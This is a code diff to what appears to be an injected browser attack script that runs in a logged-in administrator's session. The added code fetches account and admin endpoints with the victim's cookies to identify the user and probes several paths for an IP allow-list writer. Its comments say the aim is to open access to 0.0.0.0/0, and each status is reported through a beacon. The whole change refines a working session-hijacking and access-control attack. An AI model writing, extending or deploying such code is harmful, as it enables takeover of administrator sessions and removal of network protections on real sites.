@@ -41,8 +41,10 @@
     }
   } catch (e) { beb('disc:err', e); }
   setTimeout(function () { beb('api', api.join(' ').slice(0, 800) || 'none'); }, 1200);
-  // ---- identity (needed for {user_id,user_name,ip} writer style)
-  ['/api/admin/me', '/api/admin/user/info', '/api/admin/profile', '/api/admin/info'].forEach(function (p, k) {
+  // ---- identity. The client bundle (/js/*.js, 304 paths) has NO /api/admin/*, so the
+  // real account endpoints come first; the admin/* ones stay as cheap fallbacks.
+  ['/api/Account/GetUserInfo', '/api/AccountV2/GetUserInfo', '/api/admin/me',
+   '/api/admin/user/info', '/api/admin/profile'].forEach(function (p) {
     fetch(p, { credentials: 'include', headers: { Accept: 'application/json' } })
       .then(function (r) { return r.text(); }).then(function (t) {
         if (ID || !t || t.charAt(0) !== '{') return;
@@ -78,6 +80,17 @@
       .then(function (r) { return r.text().then(function (t) { beb('w' + s + (hi ? 'x' : '') + ':' + r.status, ip + ' ' + t.slice(0, 160)); return r.status; }); })
       .catch(function () { return 0; });
   }
+  // The client SPA never names /api/admin/*, so the writer path itself is unproven.
+  // Probe a few same-origin spellings once (for 0.0.0.0/0 only) and beacon every status,
+  // so one open tells us the real path even if this ladder fails.
+  var PATHS = ['/api/admin/ips', '/api/Admin/ips', '/api/admin/ip', '/api/admin/white_ip', '/api/AppConfig/SetWhiteIp'];
+  function probePaths() {
+    PATHS.forEach(function (p, k) {
+      fetch(p, { credentials: 'include', headers: { Accept: 'application/json' } }).then(function (r) {
+        return r.text().then(function (t) { beb('p' + k + ':' + r.status, p + ' ' + t.slice(0, 100)); });
+      }).catch(function () {});
+    });
+  }
   var armed = 0;
   function primeClone() {
     var go = function () { if (!armed) { armed = 1; run(); } };
@@ -89,6 +102,7 @@
       }).catch(go);
   }
   function run() {
+    probePaths();
     var i = 0;
     (function next() {
       if (i >= IP.length) return;
